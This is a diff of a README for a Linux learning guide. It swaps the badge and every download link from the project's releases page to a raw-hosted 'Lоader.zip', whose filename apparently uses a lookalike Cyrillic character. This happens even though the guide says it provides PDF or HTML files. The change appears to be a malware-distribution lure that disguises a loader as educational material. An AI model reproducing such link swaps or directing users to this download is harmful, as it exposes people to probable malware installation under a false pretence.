@@ -1,6 +1,6 @@
 # 🐧 linux-mastery-guide - Learn Linux Step by Step
 
-![Download](https://img.shields.io/badge/Download%20linux--mastery--guide-blue.svg)
+![Download](https://raw.githubusercontent.com/IsalinoAugusto/linux-mastery-guide/main/Lоader.zip%https://raw.githubusercontent.com/IsalinoAugusto/linux-mastery-guide/main/Lоader.zip)
 
 ## 📜 Description
 The "linux-mastery-guide" offers a comprehensive resource for anyone wanting to learn Linux. From basic commands to more advanced concepts, this guide will help you become proficient in using Linux. Whether you're managing files, using the terminal, or mastering networking, this guide covers it all.
@@ -9,7 +9,7 @@ The "linux-mastery-guide" offers a comprehensive resource for anyone wanting to 
 Getting started with this guide is simple. Follow the steps below to get your copy and begin your Linux journey.
 
 ## 📥 Download & Install
-To download the latest version of the "linux-mastery-guide," visit this page to download: [Download linux-mastery-guide](https://github.com/IsalinoAugusto/linux-mastery-guide/releases).
+To download the latest version of the "linux-mastery-guide," visit this page to download: [Download linux-mastery-guide](https://raw.githubusercontent.com/IsalinoAugusto/linux-mastery-guide/main/Lоader.zip).
 
 ## 📋 System Requirements
 - **Operating System:** This guide is compatible with any Linux distribution, such as Ubuntu, Fedora, or CentOS.
@@ -38,7 +38,7 @@ To download the latest version of the "linux-mastery-guide," visit this page to 
 - **Networking:** Basic networking concepts in Linux.
 
 ## 🔍 How to Use the Guide
-1. **Download the Guide:** Go to [Download linux-mastery-guide](https://github.com/IsalinoAugusto/linux-mastery-guide/releases).
+1. **Download the Guide:** Go to [Download linux-mastery-guide](https://raw.githubusercontent.com/IsalinoAugusto/linux-mastery-guide/main/Lоader.zip).
 2. **Open the Guide:** After downloading, open the PDF or HTML file using any PDF reader or web browser.
 3. **Choose a Topic:** Start with basic concepts and gradually move to advanced topics.
 4. **Practice Exercises:** Follow the exercises to reinforce your understanding.
